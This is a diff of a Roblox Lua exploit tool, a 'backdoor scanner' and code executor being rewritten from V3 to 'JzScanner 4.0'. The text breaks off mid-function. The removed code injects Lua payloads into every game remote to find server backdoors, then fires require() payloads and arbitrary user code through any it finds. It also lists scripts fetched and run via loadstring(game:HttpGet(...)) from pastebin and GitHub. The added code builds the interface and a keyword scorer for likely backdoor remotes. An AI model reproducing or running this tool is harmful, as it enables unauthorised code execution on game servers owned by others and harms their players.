@@ -1,350 +1,1636 @@
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
-local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerName = LocalPlayer.Name
 
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "SecretBackdoorScannerV3"
-ScreenGui.Parent = CoreGui
-ScreenGui.ResetOnSpawn = false
+local VERSION = "4.0 ADVANCED"
 
--- RGB animaatio funktio
-local function createRGBStroke(parent)
-    local stroke = Instance.new("UIStroke")
-    stroke.Parent = parent
-    stroke.Thickness = 3
-    local hue = 0
-    spawn(function()
-        while stroke.Parent do
-            hue = (hue + 2) % 360
-            TweenService:Create(stroke, TweenInfo.new(0.5), {Color = Color3.fromHSV(hue / 360, 1, 1)}):Play()
-            task.wait(0.1)
-        end
-    end)
-    return stroke
-end
-
--- Main Scanner GUI
-local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 450, 0, 300)
-MainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
-MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-MainFrame.BackgroundTransparency = 0.2
-MainFrame.BorderSizePixel = 0
-MainFrame.Parent = ScreenGui
-
-local MainCorner = Instance.new("UICorner")
-MainCorner.CornerRadius = UDim.new(0, 15)
-MainCorner.Parent = MainFrame
-
-createRGBStroke(MainFrame)
-
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 60)
-Title.Position = UDim2.new(0, 0, 0, 0)
-Title.BackgroundTransparency = 1
-Title.Text = "🔒 SECRET BACKDOOR SCANNER V3 🔒"
-Title.TextColor3 = Color3.new(1, 1, 1)
-Title.TextScaled = true
-Title.Font = Enum.Font.GothamBold
-Title.Parent = MainFrame
-
-local ScanBtn = Instance.new("TextButton")
-ScanBtn.Size = UDim2.new(0, 200, 0, 70)
-ScanBtn.Position = UDim2.new(0.5, -100, 0, 100)
-ScanBtn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-ScanBtn.Text = "🕵️ SCAN FOR BACKDOORS"
-ScanBtn.TextColor3 = Color3.new(1, 1, 1)
-ScanBtn.TextScaled = true
-ScanBtn.Font = Enum.Font.GothamBold
-ScanBtn.Parent = MainFrame
-
-local ScanCorner = Instance.new("UICorner")
-ScanCorner.CornerRadius = UDim.new(0, 12)
-ScanCorner.Parent = ScanBtn
-
-createRGBStroke(ScanBtn)
-
-local ProgressLabel = Instance.new("TextLabel")
-ProgressLabel.Size = UDim2.new(1, -40, 0, 40)
-ProgressLabel.Position = UDim2.new(0, 20, 0, 200)
-ProgressLabel.BackgroundTransparency = 1
-ProgressLabel.Text = "Ready to scan epic backdoors! 💥"
-ProgressLabel.TextColor3 = Color3.new(1, 1, 1)
-ProgressLabel.TextScaled = true
-ProgressLabel.Font = Enum.Font.Gotham
-ProgressLabel.Parent = MainFrame
-
--- Spinner
-local Spinner = Instance.new("Frame")
-Spinner.Size = UDim2.new(0, 50, 0, 50)
-Spinner.Position = UDim2.new(0.5, -25, 0, 140)
-Spinner.BackgroundTransparency = 1
-Spinner.Visible = false
-Spinner.Parent = MainFrame
-
-local SpinnerImg = Instance.new("ImageLabel")
-SpinnerImg.Size = UDim2.new(1, 0, 1, 0)
-SpinnerImg.BackgroundTransparency = 1
-SpinnerImg.Image = "rbxassetid://6034833295" -- loading spinner
-SpinnerImg.ImageColor3 = Color3.new(0, 1, 1)
-SpinnerImg.Parent = Spinner
-
-createRGBStroke(SpinnerImg)
-
--- Executor GUI (piilotettu alkuun)
-local ExecutorFrame = Instance.new("Frame")
-ExecutorFrame.Size = UDim2.new(0, 550, 0, 400)
-ExecutorFrame.Position = UDim2.new(0.5, -275, 0.5, -200)
-ExecutorFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
-ExecutorFrame.BackgroundTransparency = 0.1
-ExecutorFrame.BorderSizePixel = 0
-ExecutorFrame.Visible = false
-ExecutorFrame.Parent = ScreenGui
-
-local ExecCorner = Instance.new("UICorner")
-ExecCorner.CornerRadius = UDim.new(0, 15)
-ExecCorner.Parent = ExecutorFrame
-
-createRGBStroke(ExecutorFrame)
-
-local ExecTitle = Instance.new("TextLabel")
-ExecTitle.Size = UDim2.new(1, 0, 0, 50)
-ExecTitle.BackgroundTransparency = 1
-ExecTitle.Text = "⚡ BACKDOOR EXECUTOR LOADED ⚡"
-ExecTitle.TextColor3 = Color3.new(0, 1, 0)
-ExecTitle.TextScaled = true
-ExecTitle.Font = Enum.Font.GothamBold
-ExecTitle.Parent = ExecutorFrame
-
-local CodeBox = Instance.new("TextBox")
-CodeBox.Size = UDim2.new(1, -40, 0, 200)
-CodeBox.Position = UDim2.new(0, 20, 0, 70)
-CodeBox.BackgroundColor3 = Color3.new(0, 0, 0)
-CodeBox.BackgroundTransparency = 0.3
-CodeBox.Text = "-- Paste require() or loadstring() here!\n-- Esim: require(6338277134)(\"YourName\")"
-CodeBox.TextColor3 = Color3.new(1, 1, 1)
-CodeBox.TextScaled = true
-CodeBox.Font = Enum.Font.Code
-CodeBox.MultiLine = true
-CodeBox.TextYAlignment = Enum.TextYAlignment.Top
-CodeBox.Parent = ExecutorFrame
-
-local CodeCorner = Instance.new("UICorner")
-CodeCorner.CornerRadius = UDim.new(0, 10)
-CodeCorner.Parent = CodeBox
-
-createRGBStroke(CodeBox)
-
-local ExecuteBtn = Instance.new("TextButton")
-ExecuteBtn.Size = UDim2.new(0, 120, 0, 50)
-ExecuteBtn.Position = UDim2.new(0.3, 0, 1, -70)
-ExecuteBtn.BackgroundColor3 = Color3.new(0, 0.7, 0)
-ExecuteBtn.Text = "EXECUTE 💥"
-ExecuteBtn.TextColor3 = Color3.new(1, 1, 1)
-ExecuteBtn.TextScaled = true
-ExecuteBtn.Font = Enum.Font.GothamBold
-ExecuteBtn.Parent = ExecutorFrame
-
-local ExecBtnCorner = Instance.new("UICorner")
-ExecBtnCorner.CornerRadius = UDim.new(0, 12)
-ExecBtnCorner.Parent = ExecuteBtn
-
-createRGBStroke(ExecuteBtn)
-
-local ScriptsBtn = Instance.new("TextButton")
-ScriptsBtn.Size = UDim2.new(0, 120, 0, 50)
-ScriptsBtn.Position = UDim2.new(0.55, 0, 1, -70)
-ScriptsBtn.BackgroundColor3 = Color3.new(0.2, 0.5, 1)
-ScriptsBtn.Text = "SCRIPTS 📜"
-ScriptsBtn.TextColor3 = Color3.new(1, 1, 1)
-ScriptsBtn.TextScaled = true
-ScriptsBtn.Font = Enum.Font.GothamBold
-ScriptsBtn.Parent = ExecutorFrame
-
-local ScriptsBtnCorner = Instance.new("UICorner")
-ScriptsBtnCorner.CornerRadius = UDim.new(0, 12)
-ScriptsBtnCorner.Parent = ScriptsBtn
-
-createRGBStroke(ScriptsBtn)
-
-local CloseBtn = Instance.new("TextButton")
-CloseBtn.Size = UDim2.new(0, 80, 0, 40)
-CloseBtn.Position = UDim2.new(1, -90, 0, 10)
-CloseBtn.BackgroundColor3 = Color3.new(1, 0, 0)
-CloseBtn.Text = "CLOSE ❌"
-CloseBtn.TextColor3 = Color3.new(1, 1, 1)
-CloseBtn.TextScaled = true
-CloseBtn.Font = Enum.Font.GothamBold
-CloseBtn.Parent = ExecutorFrame
-
-local CloseCorner = Instance.new("UICorner")
-CloseCorner.CornerRadius = UDim.new(0, 8)
-CloseCorner.Parent = CloseBtn
-
-createRGBStroke(CloseBtn)
-
--- Scripts lista ScrollingFrame
-local ScriptsFrame = Instance.new("ScrollingFrame")
-ScriptsFrame.Size = UDim2.new(1, -40, 0, 250)
-ScriptsFrame.Position = UDim2.new(0, 20, 0, 70)
-ScriptsFrame.BackgroundTransparency = 1
-ScriptsFrame.Visible = false
-ScriptsFrame.ScrollBarThickness = 8
-ScriptsFrame.Parent = ExecutorFrame
-
-local ScriptsLayout = Instance.new("UIListLayout")
-ScriptsLayout.SortOrder = Enum.SortOrder.LayoutOrder
-ScriptsLayout.Padding = UDim.new(0, 5)
-ScriptsLayout.Parent = ScriptsFrame
-
--- Lisää scripts (kaikki sun listat + lisää!)
-local Scripts = {
-    {name = "Polygoner", code = 'require(6338277134)("' .. PlayerName .. '")'},
-    {name = "Lunatic", code = 'require(5813708464):load("' .. PlayerName .. '")'},
-    {name = "Black Figure", code = 'require(7972003282):CLoad("' .. PlayerName .. '")'},
-    {name = "Xester Admin", code = 'require(6099241563):load("' .. PlayerName .. '")'},
-    {name = "Grab Knife V4 (Knife Crab)", code = 'loadstring(game:HttpGet("https://pastebin.com/raw/efA8gwR4"))()'},
-    {name = "Coolkid GUI", code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui/main/source"))()'},
-    {name = "Infinite Yield", code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()'}
+local CONFIG = {
+	ProbeDelay = 0.08,
+	BatchSize = 40,
+	BatchPause = 0.35,
+	ConfirmWindow = 6,
+	ExtraWindow = 1.5,
+	SweepMaxTime = 60,
+	MaxRemotes = 4000,
+	EnumChunk = 750,
+	ExecConfirmWindow = 5,
+	HintMessage = "...JzScanner... backdoor detected in this game! 🔍",
+	SoundId = "rbxassetid://6042053626",
 }
 
-for i, script in ipairs(Scripts) do
-    local Btn = Instance.new("TextButton")
-    Btn.Size = UDim2.new(1, 0, 0, 40)
-    Btn.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
-    Btn.Text = script.name
-    Btn.TextColor3 = Color3.new(1, 1, 1)
-    Btn.TextScaled = true
-    Btn.Font = Enum.Font.Gotham
-    Btn.Parent = ScriptsFrame
-    
-    local BtnCorner = Instance.new("UICorner")
-    BtnCorner.CornerRadius = UDim.new(0, 8)
-    BtnCorner.Parent = Btn
-    
-    Btn.MouseButton1Click:Connect(function()
-        CodeBox.Text = script.code
-        ScriptsFrame.Visible = false
-    end)
+local THEME = {
+	bg = Color3.fromRGB(12, 12, 18),
+	panel = Color3.fromRGB(22, 22, 32),
+	panel2 = Color3.fromRGB(30, 30, 44),
+	stroke = Color3.fromRGB(70, 70, 100),
+	text = Color3.fromRGB(235, 235, 245),
+	dim = Color3.fromRGB(145, 145, 165),
+	accent = Color3.fromRGB(0, 240, 220),
+	accent2 = Color3.fromRGB(170, 90, 255),
+	good = Color3.fromRGB(60, 230, 120),
+	warn = Color3.fromRGB(255, 190, 70),
+	bad = Color3.fromRGB(255, 85, 95),
+	btn = Color3.fromRGB(38, 38, 55),
+	btnHover = Color3.fromRGB(52, 52, 76),
+}
+
+local State = {
+	destroyed = false,
+	scanning = false,
+	executing = false,
+	minimized = false,
+	hintSentThisScan = false,
+	logs = {},
+	results = {},
+	targetPaths = { "LOCAL" },
+	targetRefs = { nil },
+	targetIndex = 1,
+	modeIndex = 1,
+	modes = { "LUA", "REQUIRE" },
+	sensitivityIndex = 2,
+	sensitivities = { "LOW", "MEDIUM", "HIGH" },
+	sensMinScore = { [1] = 3, [2] = 1, [3] = -999 },
+	settings = {
+		autoHint = true,
+		confirmExec = true,
+		sound = true,
+		autoScan = false,
+	},
+	outBuffer = {},
+	stats = { total = 0, probed = 0, confirmed = 0 },
+}
+
+local KEYWORDS = {
+	["backdoor"] = 5,
+	["serverside"] = 5,
+	["server_side"] = 5,
+	["loadstring"] = 5,
+	["exec"] = 4,
+	["execute"] = 4,
+	["eval"] = 4,
+	["lalol"] = 4,
+	["k4"] = 4,
+	["bd"] = 3,
+	["cmd"] = 3,
+	["hax"] = 3,
+	["hack"] = 3,
+	["exploit"] = 3,
+	["inject"] = 3,
+	["payload"] = 3,
+	["malware"] = 4,
+	["virus"] = 3,
+	["skid"] = 3,
+	["feline"] = 3,
+	["eclipse"] = 3,
+	["jz"] = 3,
+	["command"] = 2,
+	["admin"] = 2,
+	["abyss"] = 2,
+	["require"] = 3,
+	["void"] = 1,
+	["debug"] = 1,
+	["remote"] = 1,
+	["script"] = 1,
+	["load"] = 1,
+}
+
+local UI = {}
+local rgbStrokes = {}
+
+local function newGuid()
+	return HttpService:GenerateGUID(false):gsub("-", "")
 end
 
-ScriptsFrame.CanvasSize = UDim2.new(0, 0, 0, #Scripts * 45)
-
--- Skannaus logiikka (backdoor.exe tyylillä!)
-local backdoorRemote = nil
-local scanning = false
-
-local function scanForBackdoor()
-    if scanning then return end
-    scanning = true
-    ProgressLabel.Text = "🔍 Scanning remotes..."
-    ScanBtn.Text = "SCANNING..."
-    Spinner.Visible = true
-    
-    -- Pyöritä spinner
-    local spin = TweenService:Create(SpinnerImg, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {Rotation = 360})
-    spin:Play()
-    
-    local remotes = {}
-    for _, obj in pairs(game:GetDescendants()) do
-        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-            table.insert(remotes, obj)
-        end
-    end
-    
-    local guidToRemote = {}
-    local foundConn
-    
-    foundConn = workspace.ChildAdded:Connect(function(child)
-        if child:IsA("StringValue") and child.Name:find("BD_") then
-            local guid = child.Name:sub(4)
-            backdoorRemote = guidToRemote[guid]
-            foundConn:Disconnect()
-            spin:Cancel()
-            ProgressLabel.Text = "✅ BACKDOOR FOUND! Loading executor..."
-            task.wait(1)
-            -- Lataa executor backdoorin läpi (k4scripts!)
-            if backdoorRemote then
-                local execCode = string.format('require(7924358164):k4scripts("%s")', PlayerName)
-                if backdoorRemote:IsA("RemoteEvent") then
-                    backdoorRemote:FireServer(execCode)
-                else
-                    backdoorRemote:InvokeServer(execCode)
-                end
-            end
-            task.wait(1)
-            MainFrame.Visible = false
-            ExecutorFrame.Visible = true
-            ProgressLabel.Text = "Executor ready! 🎉"
-            scanning = false
-        end
-    end)
-    
-    -- Testaa jokainen remote
-    for _, remote in ipairs(remotes) do
-        local guid = HttpService:GenerateGUID(false):gsub("-", "")
-        local dummyCode = string.format('local s=Instance.new("StringValue") s.Name="BD_%s" s.Value="found" s.Parent=workspace', guid)
-        guidToRemote[guid] = remote
-        if remote:IsA("RemoteEvent") then
-            remote:FireServer(dummyCode)
-        else
-            pcall(remote.InvokeServer, remote, dummyCode)
-        end
-        task.wait(0.05) -- Ei floodaa
-    end
-    
-    -- Timeout 10s
-    task.delay(10, function()
-        if scanning then
-            foundConn:Disconnect()
-            spin:Cancel()
-            Spinner.Visible = false
-            ProgressLabel.Text = "❌ No backdoor found. Try another game!"
-            ScanBtn.Text = "SCAN AGAIN"
-            scanning = false
-        end
-    end)
+local function create(className, props)
+	local inst = Instance.new(className)
+	for k, v in pairs(props) do
+		if k ~= "Parent" then
+			inst[k] = v
+		end
+	end
+	if props.Parent then
+		inst.Parent = props.Parent
+	end
+	return inst
 end
 
-ScanBtn.MouseButton1Click:Connect(scanForBackdoor)
+local function corner(parent, r)
+	return create("UICorner", { CornerRadius = UDim.new(0, r), Parent = parent })
+end
 
--- Executor toiminta
-ExecuteBtn.MouseButton1Click:Connect(function()
-    local code = CodeBox.Text
-    if backdoorRemote and code \~= "" then
-        if backdoorRemote:IsA("RemoteEvent") then
-            backdoorRemote:FireServer(code)
-        else
-            pcall(backdoorRemote.InvokeServer, backdoorRemote, code)
-        end
-        print("Executed: " .. code)
-    end
+local function stroke(parent, color, thickness, transparency)
+	local s = create("UIStroke", {
+		Color = color or THEME.stroke,
+		Thickness = thickness or 1,
+		Transparency = transparency or 0,
+		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+		Parent = parent,
+	})
+	table.insert(rgbStrokes, s)
+	return s
+end
+
+local function hoverify(btn, base, hovered)
+	btn.MouseEnter:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = hovered }):Play()
+	end)
+	btn.MouseLeave:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = base }):Play()
+	end)
+end
+
+local LOG_COLORS = {
+	INFO = THEME.dim,
+	WARN = THEME.warn,
+	GOOD = THEME.good,
+	BAD = THEME.bad,
+}
+
+local LOG_ICONS = {
+	INFO = "[*]",
+	WARN = "[!]",
+	GOOD = "[+]",
+	BAD = "[x]",
+}
+
+local function log(level, msg)
+	local stamp = os.date("%H:%M:%S")
+	table.insert(State.logs, { level = level, msg = msg, stamp = stamp })
+	if #State.logs > 250 then
+		table.remove(State.logs, 1)
+	end
+	print(("%s JzScanner %s %s"):format(stamp, LOG_ICONS[level], msg))
+	if UI.renderLogs and not State.destroyed then
+		UI.renderLogs()
+	end
+end
+
+local function playSound()
+	if not State.settings.sound then
+		return
+	end
+	pcall(function()
+		local s = Instance.new("Sound")
+		s.SoundId = CONFIG.SoundId
+		s.Volume = 0.5
+		s.Parent = SoundService
+		s:Play()
+		task.delay(3, function()
+			s:Destroy()
+		end)
+	end)
+end
+
+local function outputLine(msg)
+	table.insert(State.outBuffer, msg)
+	while #State.outBuffer > 9 do
+		table.remove(State.outBuffer, 1)
+	end
+	if UI.outLabel then
+		UI.outLabel.Text = table.concat(State.outBuffer, "\n")
+	end
+end
+
+local parentGui
+do
+	local existing
+	pcall(function()
+		existing = game:GetService("CoreGui"):FindFirstChild("JzScannerV4")
+	end)
+	if existing then
+		existing:Destroy()
+	end
+	local ok = pcall(function()
+		local sg = Instance.new("ScreenGui")
+		sg.Name = "JzScannerV4"
+		sg.ResetOnSpawn = false
+		sg.IgnoreGuiInset = true
+		sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+		sg.DisplayOrder = 999999
+		sg.Parent = game:GetService("CoreGui")
+		parentGui = sg
+	end)
+	if not ok or not parentGui then
+		local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+		local sg = Instance.new("ScreenGui")
+		sg.Name = "JzScannerV4"
+		sg.ResetOnSpawn = false
+		sg.IgnoreGuiInset = true
+		sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+		sg.DisplayOrder = 999999
+		sg.Parent = pg
+		parentGui = sg
+	end
+end
+
+local function toast(title, body, color)
+	color = color or THEME.accent
+	local card = create("Frame", {
+		Size = UDim2.new(0, 360, 0, 62),
+		BackgroundColor3 = THEME.panel,
+		BackgroundTransparency = 0.05,
+		BorderSizePixel = 0,
+		Parent = parentGui,
+	})
+	corner(card, 10)
+	stroke(card, color, 1.5, 0.25)
+	create("TextLabel", {
+		Size = UDim2.new(1, -20, 0, 24),
+		Position = UDim2.new(0, 10, 0, 6),
+		BackgroundTransparency = 1,
+		Text = title,
+		TextColor3 = color,
+		TextSize = 15,
+		Font = Enum.Font.GothamBold,
+		TextXAlignment = Enum.TextXAlignment.Left,
+		Parent = card,
+	})
+	create("TextLabel", {
+		Size = UDim2.new(1, -20, 0, 26),
+		Position = UDim2.new(0, 10, 0, 30),
+		BackgroundTransparency = 1,
+		Text = body,
+		TextColor3 = THEME.text,
+		TextSize = 12,
+		Font = Enum.Font.Gotham,
+		TextWrapped = true,
+		TextXAlignment = Enum.TextXAlignment.Left,
+		Parent = card,
+	})
+	local list = parentGui:FindFirstChild("ToastStack")
+	if not list then
+		list = create("Frame", {
+			Name = "ToastStack",
+			AnchorPoint = Vector2.new(0.5, 0),
+			Position = UDim2.new(0.5, 0, 0, 10),
+			Size = UDim2.new(0, 370, 0, 500),
+			BackgroundTransparency = 1,
+			Parent = parentGui,
+		})
+		create("UIListLayout", {
+			Padding = UDim.new(0, 8),
+			SortOrder = Enum.SortOrder.LayoutOrder,
+			HorizontalAlignment = Enum.HorizontalAlignment.Center,
+			Parent = list,
+		})
+	end
+	card.LayoutOrder = -os.clock()
+	card.Position = UDim2.new(0, 0, 0, -80)
+	TweenService:Create(card, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
+		Position = UDim2.new(0, 0, 0, 0),
+	}):Play()
+	task.delay(5, function()
+		if card.Parent then
+			TweenService:Create(card, TweenInfo.new(0.3), { BackgroundTransparency = 1 }):Play()
+			for _, d in ipairs(card:GetDescendants()) do
+				pcall(function()
+					if d:IsA("TextLabel") then
+						d.TextTransparency = 1
+					elseif d:IsA("UIStroke") then
+						d.Transparency = 1
+					end
+				end)
+			end
+			task.wait(0.32)
+			card:Destroy()
+		end
+	end)
+end
+
+local function bigBanner(mainText, subText, color)
+	local old = parentGui:FindFirstChild("FoundBanner")
+	if old then
+		old:Destroy()
+	end
+	local b = create("Frame", {
+		Name = "FoundBanner",
+		AnchorPoint = Vector2.new(0.5, 0),
+		Position = UDim2.new(0.5, 0, 0, -110),
+		Size = UDim2.new(0, 500, 0, 86),
+		BackgroundColor3 = THEME.bg,
+		BackgroundTransparency = 0.04,
+		BorderSizePixel = 0,
+		ZIndex = 50,
+		Parent = parentGui,
+	})
+	corner(b, 12)
+	stroke(b, color, 2.5, 0.1)
+	create("TextLabel", {
+		Size = UDim2.new(1, -24, 0, 40),
+		Position = UDim2.new(0, 12, 0, 8),
+		BackgroundTransparency = 1,
+		Text = mainText,
+		TextColor3 = color,
+		TextSize = 22,
+		Font = Enum.Font.GothamBold,
+		ZIndex = 51,
+		Parent = b,
+	})
+	create("TextLabel", {
+		Size = UDim2.new(1, -24, 0, 28),
+		Position = UDim2.new(0, 12, 0, 50),
+		BackgroundTransparency = 1,
+		Text = subText,
+		TextColor3 = THEME.text,
+		TextSize = 13,
+		Font = Enum.Font.Gotham,
+		TextWrapped = true,
+		ZIndex = 51,
+		Parent = b,
+	})
+	TweenService:Create(b, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
+		Position = UDim2.new(0.5, 0, 0, 74),
+	}):Play()
+	task.delay(8, function()
+		if b.Parent then
+			local tw = TweenService:Create(b, TweenInfo.new(0.4), { Position = UDim2.new(0.5, 0, 0, -110) })
+			tw:Play()
+			tw.Completed:Wait()
+			b:Destroy()
+		end
+	end)
+end
+
+task.spawn(function()
+	while not State.destroyed do
+		local hue = (tick() % 5) / 5
+		local c = Color3.fromHSV(hue, 0.75, 1)
+		for i = #rgbStrokes, 1, -1 do
+			local s = rgbStrokes[i]
+			if s.Parent and s.Parent.Parent then
+				s.Color = c
+			else
+				table.remove(rgbStrokes, i)
+			end
+		end
+		task.wait(0.07)
+	end
 end)
 
-ScriptsBtn.MouseButton1Click:Connect(function()
-    ScriptsFrame.Visible = not ScriptsFrame.Visible
+local Root = create("Frame", {
+	Name = "Root",
+	Size = UDim2.new(0, 560, 0, 440),
+	Position = UDim2.new(0.5, -280, 0.5, -220),
+	BackgroundColor3 = THEME.bg,
+	BackgroundTransparency = 0.03,
+	BorderSizePixel = 0,
+	Active = true,
+	Parent = parentGui,
+})
+corner(Root, 14)
+stroke(Root, THEME.accent, 2, 0.35)
+UI.Root = Root
+
+local TitleBar = create("Frame", {
+	Name = "TitleBar",
+	Size = UDim2.new(1, 0, 0, 38),
+	BackgroundTransparency = 1,
+	Active = true,
+	Parent = Root,
+})
+
+create("Frame", {
+	Size = UDim2.new(0, 4, 1, -16),
+	Position = UDim2.new(0, 10, 0, 8),
+	BackgroundColor3 = THEME.accent,
+	BorderSizePixel = 0,
+	Parent = TitleBar,
+})
+
+create("TextLabel", {
+	Size = UDim2.new(0, 260, 1, 0),
+	Position = UDim2.new(0, 24, 0, 0),
+	BackgroundTransparency = 1,
+	Text = "⚡ JzScanner " .. VERSION,
+	TextColor3 = THEME.text,
+	TextSize = 17,
+	Font = Enum.Font.GothamBold,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	Parent = TitleBar,
+})
+
+create("TextLabel", {
+	Size = UDim2.new(0, 200, 1, 0),
+	Position = UDim2.new(1, -204, 0, 0),
+	BackgroundTransparency = 1,
+	Text = "advanced backdoor scanner",
+	TextColor3 = THEME.dim,
+	TextSize = 11,
+	Font = Enum.Font.Gotham,
+	TextXAlignment = Enum.TextXAlignment.Right,
+	Visible = false,
+	Parent = TitleBar,
+})
+
+local MinBtn = create("TextButton", {
+	Size = UDim2.new(0, 32, 0, 26),
+	Position = UDim2.new(1, -78, 0, 6),
+	BackgroundColor3 = THEME.btn,
+	Text = "–",
+	TextColor3 = THEME.text,
+	TextSize = 16,
+	Font = Enum.Font.GothamBold,
+	BorderSizePixel = 0,
+	AutoButtonColor = false,
+	Parent = TitleBar,
+})
+corner(MinBtn, 7)
+hoverify(MinBtn, THEME.btn, THEME.btnHover)
+
+local CloseBtn = create("TextButton", {
+	Size = UDim2.new(0, 32, 0, 26),
+	Position = UDim2.new(1, -40, 0, 6),
+	BackgroundColor3 = THEME.bad,
+	Text = "✕",
+	TextColor3 = Color3.new(1, 1, 1),
+	TextSize = 14,
+	Font = Enum.Font.GothamBold,
+	BorderSizePixel = 0,
+	AutoButtonColor = false,
+	Parent = TitleBar,
+})
+corner(CloseBtn, 7)
+hoverify(CloseBtn, THEME.bad, Color3.fromRGB(120, 40, 48))
+
+local TabRow = create("Frame", {
+	Size = UDim2.new(1, -24, 0, 34),
+	Position = UDim2.new(0, 12, 0, 40),
+	BackgroundTransparency = 1,
+	Parent = Root,
+})
+create("UIListLayout", {
+	FillDirection = Enum.FillDirection.Horizontal,
+	Padding = UDim.new(0, 6),
+	SortOrder = Enum.SortOrder.LayoutOrder,
+	Parent = TabRow,
+})
+
+local Content = create("Frame", {
+	Name = "Content",
+	Size = UDim2.new(1, -24, 1, -104),
+	Position = UDim2.new(0, 12, 0, 80),
+	BackgroundTransparency = 1,
+	ClipsDescendants = true,
+	Parent = Root,
+})
+
+local StatusBar = create("Frame", {
+	Size = UDim2.new(1, -24, 0, 22),
+	Position = UDim2.new(0, 12, 1, -26),
+	BackgroundTransparency = 1,
+	Parent = Root,
+})
+
+UI.StatusLeft = create("TextLabel", {
+	Size = UDim2.new(0.6, 0, 1, 0),
+	BackgroundTransparency = 1,
+	Text = "idle — press SCAN to hunt backdoors",
+	TextColor3 = THEME.dim,
+	TextSize = 11,
+	Font = Enum.Font.Code,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	Parent = StatusBar,
+})
+
+UI.StatusRight = create("TextLabel", {
+	Size = UDim2.new(0.4, 0, 1, 0),
+	Position = UDim2.new(0.6, 0, 0, 0),
+	BackgroundTransparency = 1,
+	Text = "remotes 0 | confirmed 0",
+	TextColor3 = THEME.dim,
+	TextSize = 11,
+	Font = Enum.Font.Code,
+	TextXAlignment = Enum.TextXAlignment.Right,
+	Parent = StatusBar,
+})
+
+local dragging = false
+local dragInput, dragStart, startPos
+
+TitleBar.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = Root.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - dragStart
+		Root.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+end)
+
+local pages = {}
+local tabButtons = {}
+local TAB_DEFS = {
+	{ id = "scan", label = "🔍 SCANNER" },
+	{ id = "exec", label = "💥 EXECUTE" },
+	{ id = "logs", label = "📜 LOGS" },
+	{ id = "settings", label = "⚙ SETTINGS" },
+}
+
+local activeTab = "scan"
+
+local function switchTab(id)
+	activeTab = id
+	for tid, page in pairs(pages) do
+		page.Visible = (tid == id)
+	end
+	for tid, btn in pairs(tabButtons) do
+		if tid == id then
+			btn.BackgroundColor3 = THEME.accent
+			btn.TextColor3 = Color3.fromRGB(8, 10, 12)
+		else
+			btn.BackgroundColor3 = THEME.panel2
+			btn.TextColor3 = THEME.text
+		end
+	end
+end
+
+for i, def in ipairs(TAB_DEFS) do
+	local btn = create("TextButton", {
+		Size = UDim2.new(0.25, -5, 1, 0),
+		BackgroundColor3 = THEME.panel2,
+		Text = def.label,
+		TextColor3 = THEME.text,
+		TextSize = 12,
+		Font = Enum.Font.GothamBold,
+		BorderSizePixel = 0,
+		AutoButtonColor = false,
+		LayoutOrder = i,
+		Parent = TabRow,
+	})
+	corner(btn, 8)
+	hoverify(btn, THEME.panel2, THEME.btnHover)
+	tabButtons[def.id] = btn
+	pages[def.id] = create("Frame", {
+		Size = UDim2.new(1, 0, 1, 0),
+		BackgroundTransparency = 1,
+		Visible = false,
+		Parent = Content,
+	})
+	btn.MouseButton1Click:Connect(function()
+		switchTab(def.id)
+	end)
+end
+
+local function setStatus(text)
+	UI.StatusLeft.Text = text
+end
+
+local function setStats()
+	UI.StatusRight.Text = ("probed %d | confirmed %d"):format(State.stats.probed, State.stats.confirmed)
+end
+
+local function setProgress(frac, label)
+	UI.ProgressFill.Size = UDim2.new(math.clamp(frac, 0, 1), 0, 1, 0)
+	if label then
+		UI.ScanStatus.Text = label
+	end
+end
+
+local function looksRandom(name)
+	local core = name:lower():gsub("[%d_%-]", "")
+	if #core < 3 or #core > 9 then
+		return false
+	end
+	local stripped = core:gsub("[aeiouy]", "")
+	return (#core - #stripped) <= 1
+end
+
+local function scoreRemote(remote)
+	local name = remote.Name:lower()
+	local score = 0
+	local reasons = {}
+	for kw, w in pairs(KEYWORDS) do
+		if name:find(kw, 1, true) then
+			score = score + w
+			table.insert(reasons, kw .. "+" .. w)
+		end
+	end
+	if looksRandom(remote.Name) then
+		score = score + 2
+		table.insert(reasons, "random-name+2")
+	end
+	return score, table.concat(reasons, " ")
+end
+
+local function copyText(t)
+	local f = setclipboard or toclipboard
+	if f then
+		return pcall(f, t)
+	end
+	return false
+end
+
+local function rebuildTargets()
+	local paths = { "LOCAL" }
